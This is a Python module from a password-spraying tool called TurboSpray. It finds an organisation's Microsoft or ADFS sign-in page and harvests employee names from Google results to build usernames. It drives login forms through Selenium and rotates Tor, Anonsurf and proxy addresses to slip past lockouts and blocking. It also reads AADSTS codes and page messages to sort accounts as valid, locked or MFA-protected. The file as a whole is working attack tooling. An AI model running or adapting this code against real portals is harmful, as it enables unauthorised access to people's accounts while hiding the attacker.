try:
	from all_modules import *
except:
	from core.all_modules import *

def banner():
	headertitle = pyfiglet.figlet_format("TurboSpray", font = "slant") + "By Onvio | Version 1.0\n"
	print(headertitle)

# Empty string for selenium boxes/buttons + booleans(True-False)
USERNAMES_SUBMIT = '' ; 		PASSWORD_SUBMIT = '' ; 			LOGIN_BUTTON = '' ; 		LOGIN_BUTTON_2 = ''
analyze = False ; 				one_box = False ; 				two_boxes = False

# Portal boxes | buttons | messages | customized portals can be simply added. 
username_box 		= ['username', 'enter email','Enter email','E-Mail','user name', 'email']
password_box 		= ['password','Password','enter pass', 'Enter pass','Network Password']
login_buttons 		= ['ok','login', 'sign in', 'log in', 'log me in', 'next', 'verify', 'continue', 'volgende', 'doorgaan', 'inloggen', 'sign on', 'proceed']
mfa 				= ['Approve sign in request', "Because you've turned on two-step verification", "2FA", 'Two-Factor', 'Code', 'MFA', 'Push', 'OTP', 'Aanmeldingsaanvraag goedkeuren', 'Approve sign-in request']
wrong 				= ['Your account or password is incorrect', 'Password is incorrect', 'Login failed', 'Please correct', 'Please check', 'Authentication error', 'Unable to sign in', "Oops, that's not a match", 'Sign in failed']
lockout_detection 	= ["You've tried to sign in too many times with an incorrect account or password", 'You have exceeded five attempts', 'sign-in is blocked', 'signin blocked', 'locked', 'lockout', 'unavailable','Help us make sure you’re not a robot', 'Aanmelden geblokkeerd', 'U hebt te vaak geprobeerd u aan te melden met een onjuist account of wachtwoord','Laat ons zien dat je geen robot bent']
invalid_messages 	= ["You can't sign in here with a personal account", "The phone number you entered isn't valid", "Enter a valid email address or phone number", "We couldn't find an account with that username", 'Enter a valid email address, phone number, or Skype name', "Voer een geldig e-mailadres of telefoonnummer in", "Het opgegeven telefoonnummer is ongeldig. Uw telefoonnummer mag cijfers, spaties en deze speciale tekens bevatten: () [ ] . - # * /", "U kunt zich hier niet aanmelden met een persoonlijk account. Gebruik in plaats daarvan uw werk- of schoolaccount", "We couldn't find an account with that username. Try another, or get a new Microsoft account."]

chrome_path = f'{os.getcwd()}/core/chromedriver'

# adfsbrute: Checking customized sign in URL
def check_signin(target, args):
	os.system('sudo service tor restart')
	sleep(1)

	print("[*] Analyzing Target...")
	s = requests.Session()
	url = "https://login.microsoftonline.com/common/userrealm/?user=test@"+target+"&api-version=2.1&checkForMicrosoftAccount=true"
	response = s.get(url, verify=False)
	# Get the json data to search for the custom Sign-In URL
	json_data = json.loads(response.text)
	if 'AuthURL' in json_data:
		print("[*] Organization uses a customized sign-in page")
		# GET request, don't verify certificates
		target = s.get(json_data['AuthURL'], verify=False).url
		print('[*]', 'ADFS URL :', target)
	else:
		print("[!] Organization does not use a customized sign-in page.")
		if args.debug: 
			print(json.dumps(json_data, indent=4, sort_keys=True))
	return target

# Chrome options to optimize performance of the tools
def other_chrome_options(options):
	prefs = {"profile.managed_default_content_settings.images": 2}
	options.add_experimental_option('prefs', prefs)
	options.add_argument('--no-sandbox')
	options.add_argument("--disable-dev-shm-using") 
	options.add_argument("--disable-extensions") 
	options.add_argument("--disable-gpu") 
	#options.add_argument("--incognito")
	options.add_argument("--disable-notifications")
	options.add_argument("start-maximized") 
	options.add_argument("disable-infobars") 
	options.add_argument("--disable-setuid-sandbox")
	options.add_argument('--disable-dev-shm-usage')
	try: 
		options.add_argument(f"user-agent={UserAgent().random}")
	except:
		options.add_argument(f"user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")

# Proxy Setup | Requests
def proxy(proxies_list, target, args):
	while True:
		try:
			PROXY = random.choice(proxies_list)
			
			PROXY_http = f'http://{PROXY}'
			PROXY_https = f'https://{PROXY}'
			proxies={'https': PROXY_https}
			# Test proxies with a GET request, verification is false, because some portals such as ADFS return an error that the certificate isn't valid. 
			r = requests.get(target, proxies=proxies, timeout = 5, verify=False)
			print(f'[*] Proxy : {PROXY}  [ACTIVATED]')

		# Error Handling | Proxies
		except ProxyError:
			if args.debug: print(f"[!] Proxy : {PROXY} [Proxy Error] | Trying another one...")
			proxies_list.remove(PROXY)
			continue
		except ConnectionError:
			if args.debug: print(f"[!] Proxy : {PROXY} [ConnectionError] | Trying another one...")
			proxies_list.remove(PROXY)
			continue
		except (ConnectTimeout, ReadTimeout):
			if args.debug: print(f"[!] Proxy : {PROXY} [Timeout] | Trying another one...")
			continue
		except SSLError:
			if args.debug: print(f"[!] Proxy : {PROXY} [SSL Error] | Trying another one...")
			continue
		except MissingSchema:
			target = urlparse(target)._replace(scheme='https').geturl()
			target = target.replace('https:///', 'https://')
			continue
		break
	# Return Valid Proxy
	return PROXY

# Proxy Setup | Tor
def proxy_browser(target, headless, proxies_list, args):
	chrome_path = f'{os.getcwd()}/core/chromedriver'
	PROXY = proxy(proxies_list, target, args)
	options = Options()
	options.headless = headless
	other_chrome_options(options)
	options.add_argument(f'--proxy-server={PROXY}')
	#print(f'[*] Proxy : {PROXY}  [ACTIVATED]')
	driver = webdriver.Chrome(chrome_path, options=options)
	set_driver(driver)
	return driver, options

# Tor functions
# TOR: Get Current IP
def get_current_ip():
    print(f'[*] Your IP after activating Tor : {requests.get("http://icanhazip.com/", proxies={"http": "socks5h://localhost:9050"}).text.strip()}')

# TOR | IP Rotation
def rotate_tor():
	os.system('sudo service tor restart')
	sleep(5)
	print(f'[*] Your IP after rotating Tor : {requests.get("http://icanhazip.com/", proxies={"http": "socks5h://localhost:9050"}).text.strip()}')

# TOR | Browser
def tor_browser(headless):
	chrome_path = f'{os.getcwd()}/core/chromedriver'
	print(f'[*] Setting up Tor...')
	os.system('sudo service tor restart')
	sleep(5)
	print(f'[*] Your IP after activating Tor : {requests.get("http://icanhazip.com/", proxies={"http": "socks5h://localhost:9050"}).text.strip()}')
	options = Options()
	other_chrome_options(options)
	options.add_argument(f'--proxy-server=socks5://127.0.0.1:9050')
	options.set_headless(headless)
	driver = webdriver.Chrome(chrome_path, options=options)
	set_driver(driver)
	return driver, options

# TOR | Restart
def restart_tor_browser(headless):
	chrome_path = f'{os.getcwd()}/core/chromedriver'
	options = Options()
	other_chrome_options(options)
	options.add_argument(f'--proxy-server=socks5://127.0.0.1:9050')
	options.set_headless(headless)
	driver = webdriver.Chrome(chrome_path, options=options) ; set_driver(driver)
	return driver, options

# Not working right
def renew_tor_ip():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate(password='tor') # Tor password
        controller.signal(Signal.NEWNYM)

# Anonsurf | Browser
def anonsurf_browser(headless):
	chrome_path = f'{os.getcwd()}/core/chromedriver'
	tor_subprocess = subprocess.run(['sudo', 'anonsurf', 'start'], capture_output=True)
	while True:
		try:
			print(f'[*] Your IP after activating Anonsurf : {requests.get("https://api.ipify.org").text}')
		except:
			print("[!] Sorry, I'am facing difficulties getting the new Anonsurf IP")
			tor_subprocess = subprocess.run(['sudo', 'anonsurf', 'restart'], capture_output=True)
			continue
		break
	options = Options()
	options.headless = headless
	other_chrome_options(options)
	driver = webdriver.Chrome(chrome_path, options=options)
	set_driver(driver)
	return driver, options

# No Proxy | Browser
def no_proxy_browser(headless):
	chrome_path = f'{os.getcwd()}/core/chromedriver'
	print('[-] No Proxy provided')
	options = Options()
	options.headless = headless
	other_chrome_options(options)
	driver = webdriver.Chrome(chrome_path, options=options)
	set_driver(driver)
	return driver, options

# Anonsurf | Restart
def restart_proxy_anonsurf(args, headless, target, driver, options, proxies_list): 
	if args.list:
		print('[*] Trying other Proxy')
		kill_browser()
		driver, options = proxy_browser(target, headless, proxies_list, args)
	
	elif args.anonsurf:
		print('[*] Restarting Anonsurf')
		kill_browser()
		tor_subprocess = subprocess.run(['sudo', 'anonsurf', 'stop'], capture_output=True)
		driver, options = anonsurf_browser(headless)
	else:
		driver, options = no_proxy_browser(headless)

	go_to(target) ; sleep(args.sleep)
	
	return driver, options

# Random User Agents
headers = {
"User-Agent": f"{UserAgent().random}",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"DNT": "1",
"Connection": "keep-alive",
"Upgrade-Insecure-Requests": "1"
}

# AADSTS Codes
AADSTS_codes = { 
"AADSTS50053": ["LOCKED", "Account locked", "\t\t"],
"AADSTS50055": ["EXPIRED_PASS", "Password expired", "\t\t"],
"AADSTS50057": ["DISABLED", "User disabled", "\t\t"],
"AADSTS50126": ["INVALID_CREDS", "Invalid username or password", "\t\t"],
"AADSTS50059": ["MISSING_TENANT", "Tenant for account doesn't exist", "\t"],
"AADSTS50128": ["INVALID_DOMAIN", "Tenant for account doesn't exist", "\t"],
"AADSTS50034": ["USER_NOT_FOUND", "User does not exist", "\t"],
"AADSTS50079": ["VALID_MFA", "Response indicates MFA (Microsoft)", "\t\t"],
"AADSTS50076": ["VALID_MFA", "Response indicates MFA (Microsoft)", "\t\t"],
"AADSTS50158": ["SEC_CHAL", "Response indicates conditional access (MFA: DUO or other)", "\t\t"]}

# Autodiscover | Requests 
def send_request_autodiscover(args, request, url, auth, headers, proxies):
	return request(  # Send HTTP request
		url,
		auth=auth, # User+Pass | Sprayer
		headers=headers,
		proxies=proxies,
		allow_redirects=False, # Not necessary, most ADFS portals have a custom URL
		verify=False 
		)

# ADFS | Requests
def send_request_adfs(args, request, url, data, headers, proxies):
	return request(  # Send HTTP request
		url,
		data=data, # Integrated User+Pass in data form
		headers=headers,
		proxies=proxies,
		allow_redirects=False, # Not necessary, most ADFS portals have a custom URL
		verify=False 
		)

# Scraping | Google
def scrape_google(URL, driver, args, company, titles_list, names_list):
	go_to(URL)
	agree_button = ""
	
	if agree_button == "Consent" or "Ik ga akkoord" or "I Agree":
		click(agree_button)
	source_code = driver.page_source

	if 'Our systems have detected unusual traffic from your computer' in source_code:
		print("[!] Captcha detected, try again later or use Bing only.")
		message = 'captcha'

	if 'Our systems have detected unusual traffic from your computer' not in source_code:
		message = 'no captcha'
		soup = bs(source_code, 'lxml') # Create parsed data from the source code using Beautifulsoup
		titles = soup.find_all('h3')

		for title in titles:
			title = title.text 
			# if company.lower() in title.lower(): 
			if args.verbose: print(title)
			titles_list.append(title) 
	return titles_list

# Formatting | Usernames
def formatting(args, titles_list, names_list, format_names_list, FINAL_NAMES_LIST, output):
	# Get the names from the titles | Mostly they are seperated by "–", "-" or "|"
	for a in titles_list:
		if "–" in a:
			name = a.split("–")[0].rstrip().lstrip()
			if ',' in name:
				name = name.split(",")[0]
				names_list.append(name)
			else:
				names_list.append(name)
		elif "-" in a:
			name = a.split("-")[0].rstrip().lstrip()
			if ',' in name:
				name = name.split(",")[0]
				names_list.append(name)
			else:
				names_list.append(name)
		elif "|" in a:
			name = a.split("|")[0].rstrip().lstrip()
			if ',' in name:
				name = name.split(",")[0]
				names_list.append(name)
			else:
				names_list.append(name)

	# Formatting the Names
	if args.format:
		formatt = args.format
		for x in names_list:
			# 2 parts
			if len(x.split(' ')) == 2:
				FORMAT = f"{formatt.replace('{f}', x.split(' ')[0][0]).replace('{first}', x.split(' ')[0]).replace('.{m}', '.').replace('.{middle}','.').replace('{m}', '').replace('{middle}','').replace('{l}', x.split(' ')[1][0]).replace('{last}', x.split(' ')[1])}\n"
				if '..' in FORMAT: FORMAT = FORMAT.replace('..','.')
				format_names_list.append(FORMAT)
			# 3 parts
			elif len(x.split(' ')) == 3:
				FORMAT = f"{formatt.replace('{f}', x.split(' ')[0][0]).replace('{first}', x.split(' ')[0]).replace('{m}', x.split(' ')[1][0]).replace('{middle}', x.split(' ')[1]).replace('{l}', x.split(' ')[2][0]).replace('{last}', x.split(' ')[2])}\n"
				if '..' in FORMAT: FORMAT = FORMAT.replace('..','.')
				format_names_list.append(FORMAT)
			# 4 parts
			elif len(x.split(' ')) == 4:
				FORMAT = f"{formatt.replace('{f}', x.split(' ')[0][0]).replace('{first}', x.split(' ')[0]).replace('{m}', x.split(' ')[1][0] + x.split(' ')[2][0]).replace('{middle}', x.split(' ')[1] + x.split(' ')[2]).replace('{l}', x.split(' ')[3][0]).replace('{last}', x.split(' ')[3])}\n"
				if '..' in FORMAT: FORMAT = FORMAT.replace('..','.')	
				format_names_list.append(FORMAT)
		FINAL_NAMES_LIST = format_names_list
	else:
		FINAL_NAMES_LIST = names_list
	
	for name in FINAL_NAMES_LIST:
		FINAL_NAMES_LIST[FINAL_NAMES_LIST.index(name)] = name.replace('\n', '')

	# TXT Output
	if args.output == 'txt':
		with open(output) as f:
			old = f.read().splitlines()
			f.close()
		for i in FINAL_NAMES_LIST:
			if i not in old:
				with open(output, 'a') as f:
					f.write(i)
					f.write('\n')
					f.close()

	# CSV Output
	elif args.output == 'csv':
		old = []
		with open(output) as f:
			for line in f:
				old.append(line.split()[0])
			f.close()
		with open(output, 'a') as f:
			writer = csv.writer(f)
			for i in FINAL_NAMES_LIST:
				if i not in old:
					writer.writerow([i])
			f.close()

	# JSON Output
	elif args.output == 'json':
		with open(output) as f:
			try:
				old = json.load(f)
			except:
				pass
			f.close()
		with open(output, 'w') as f:
			for i in FINAL_NAMES_LIST:
				try:
					if i not in old:
						old.append(i)
				except:
					old = FINAL_NAMES_LIST
			f.write(json.dumps(old, indent=4, sort_keys=False))
			f.close()

# Selenium | Analyzing Portals
def analyze_portal(args, USERNAMES_SUBMIT, PASSWORD_SUBMIT, LOGIN_BUTTON, LOGIN_BUTTON_2, username_box, password_box, driver, options, target, headless, proxies_list):
	print('[*] Analyzing the portal...')

	# Analyzing Username Box
	while True:
		if USERNAMES_SUBMIT == '' :
			for x in username_box:
				if TextField(x).exists():
					USERNAMES_SUBMIT += x
					break
		if USERNAMES_SUBMIT == '':
			if args.debug: print(f'[!] USERNAME BOX')
			driver, options = restart_proxy_anonsurf(args, headless, target, driver, options, proxies_list)
			username_box_is_here = False
			continue
		else:
			username_box_is_here = True
			break
	#print(USERNAMES_SUBMIT)

	# Analyzing Password Box
	tries = 0
	while True:
		if PASSWORD_SUBMIT == '' :
			for x in password_box:
				if TextField(x).exists():
					PASSWORD_SUBMIT += x
					break
		if tries == 3:
			break
		if PASSWORD_SUBMIT == '':
			password_box_is_here = False
			tries += 1
			continue
		else:
			password_box_is_here = True
			break
	#print(PASSWORD_SUBMIT)

	# Analyzing Login Button
	if args.login_button:
		LOGIN_BUTTON = args.login_button ; click(LOGIN_BUTTON)
	else:
		while True:
			if LOGIN_BUTTON == '' :
				for x in login_buttons:
					if Button(x).exists():
						LOGIN_BUTTON += x
						break	
			if LOGIN_BUTTON == '':
				if args.debug: print(f'[!] LOGIN BUTTON')
				login_box_is_here = False
				continue
			else:
				login_box_is_here = True
				break
	#print(LOGIN_BUTTON)

	# Login Portal | One Page 2 Boxes | Spraying
	if username_box_is_here == True and password_box_is_here == True:
		PORTAL_FORMAT = 2

	# Login Portal | Two Pages 1 Box | Spraying
	elif username_box_is_here == True and password_box_is_here == False:
		PORTAL_FORMAT = 1
		write('username1', into=USERNAMES_SUBMIT)
		click(LOGIN_BUTTON)
		sleep(4)
		while True:
			if PASSWORD_SUBMIT == '' :
				for x in password_box:
					if TextField(x).exists():
						PASSWORD_SUBMIT += x
						break
			if PASSWORD_SUBMIT == '':
				if args.debug: print(f'[!] PASSWORD BOX')
				continue
			else:
				break
		#print(PASSWORD_SUBMIT)
		
		while True:
			if LOGIN_BUTTON_2 == '':
				for x in login_buttons:
					if Button(x).exists():
						LOGIN_BUTTON_2 += x
						break
			if LOGIN_BUTTON_2 == '':
				continue
			else:
				break
		#print(LOGIN_BUTTON_2)

	analyze = True

	return analyze, PORTAL_FORMAT, USERNAMES_SUBMIT, PASSWORD_SUBMIT, LOGIN_BUTTON, LOGIN_BUTTON_2, driver, options